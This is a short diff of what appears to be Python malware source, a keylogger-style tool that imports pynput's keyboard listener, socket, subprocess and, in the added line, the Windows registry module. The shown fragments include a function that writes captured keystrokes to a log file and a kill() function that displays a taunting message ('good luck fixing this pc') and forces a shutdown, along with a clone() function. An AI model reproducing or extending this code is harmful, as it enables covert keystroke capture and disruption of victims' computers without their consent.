@@ -7,6 +7,7 @@
 #twitter: @rossin135
 #github: https://github.com/rossiniroberto52
 import socket, os, subprocess, webbrowser, shutil
+from winreg import *
 from pynput.keyboard import Key as key
 from pynput.keyboard import Listener
 from getpass import getuser
@@ -33,7 +34,7 @@ def storeKeysToFile(keys):
             log.write(the_key)  
 
 def kill():
-    os.system("msg %username% your system will be shutdown because i hack then :) lol")
+    os.system("msg %username% have a nice day and good luck fixing this pc")
     os.system("shutdown -s -t 3")
 
 def clone():
